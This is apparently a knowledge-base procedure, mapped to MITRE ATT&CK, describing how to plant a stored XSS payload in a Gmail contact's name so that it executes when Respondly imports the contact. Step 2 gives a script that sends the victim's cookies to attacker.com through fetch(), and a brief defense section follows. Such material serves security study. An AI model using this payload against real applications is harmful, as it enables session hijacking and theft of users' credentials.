---
id: proc-prepare-malicious-gmail-contact
tags:
  - xss
  - gmail
  - payload-preparation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1566.001]]'
updated_at: '2025-12-14T03:15:36.242Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.001]]'
---
# Prepare-Malicious-Gmail-Contact

## Summary

This procedure involves creating a Gmail contact with an embedded JavaScript payload in the name field, exploiting the lack of sanitization in downstream applications like Respondly's import feature.

## Description

In the context of an XSS attack on Respondly, the attacker prepares a contact in Gmail where the name contains raw JavaScript code. This payload is not escaped when fetched via the Gmail API during import, allowing execution in the victim's browser. Prerequisites include access to a Gmail account; no special tools are needed beyond a web browser. Expected outcomes: A contact ready for import that delivers the payload upon rendering.

## Requirements

1. Access to a Gmail account (attacker's or victim's via phishing)
2. Web browser for editing Google Contacts
3. Knowledge of JavaScript payloads for XSS (e.g., for cookie theft)

## Defense

Defensive measures and detection strategies:

- Sanitize all imported data from external sources like Gmail API
- Implement Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous contact creations with script-like content in names

## Objectives

1. Embed arbitrary JavaScript in a Gmail contact name
2. Ensure the payload survives API fetching without alteration
3. Position the contact for import by the target application

## Instructions

### Step 1: Access Google Contacts

**Context**: Log into Gmail to reach the contacts management interface.

Navigate to contacts.google.com and sign in with the target Gmail account.

### Step 2: Create or Edit Contact

**Context**: Add the malicious payload to the contact name.

Click 'Create contact' or select an existing one. In the 'Name' field, enter a payload like `<script>fetch('http://attacker.com/steal?data='+encodeURIComponent(document.cookie));</script>`. Fill other fields optionally (e.g., email as a dummy address). Click 'Save'.

> This embeds the script directly; verify by viewing the contact—no escaping occurs in Gmail UI.

### Step 3: Verify Payload

**Context**: Confirm the contact is stored with the raw payload.

Search for the contact and inspect the name field in the browser's developer tools to ensure the `<script>` tags are present unescaped.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[T1566.001]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[gmail]]
- [[payload-preparation]]
